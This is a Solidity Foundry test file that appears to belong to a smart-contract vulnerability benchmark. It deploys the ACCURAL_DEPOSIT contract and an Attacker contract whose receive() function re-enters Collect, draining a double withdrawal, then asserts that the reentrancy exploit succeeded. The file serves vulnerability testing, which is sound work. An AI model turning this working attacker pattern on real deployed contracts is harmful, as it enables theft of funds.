
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/src/Test.sol";
import {ACCURAL_DEPOSIT, LogFile} from "../src/ACCURAL_DEPOSIT.sol";

contract TestReentrancyACCURAL_DEPOSIT is Test {

    ACCURAL_DEPOSIT public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        LogFile log = new LogFile();
        vm.etch(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46, address(log).code);
        
        _contractUnderTest = new ACCURAL_DEPOSIT();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal, uint256 depositVal) public {
        
        vm.assume(depositVal >= 2 * attackVal && attackVal >= 1 ether);
        vm.assume(depositVal < type(uint128).max);
        vm.assume(attackVal > 0);

        vm.deal(address(_contractUnderTest), depositVal * 2); 
        
        vm.deal(address(_attacker), depositVal * 2);

        vm.deal(address(this), depositVal * 2);

        _attacker.setupAttack{value: depositVal}(depositVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ACCURAL_DEPOSIT public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;

    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = ACCURAL_DEPOSIT(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        
        _victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        storedAttackVal = val;

        _victim.Collect(val);

        if (attackCallCount > 1 && address(this).balance == initialSnapshot + 2 * val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            _victim.Collect(storedAttackVal);
            attackCallCount++;
        }
    }
}
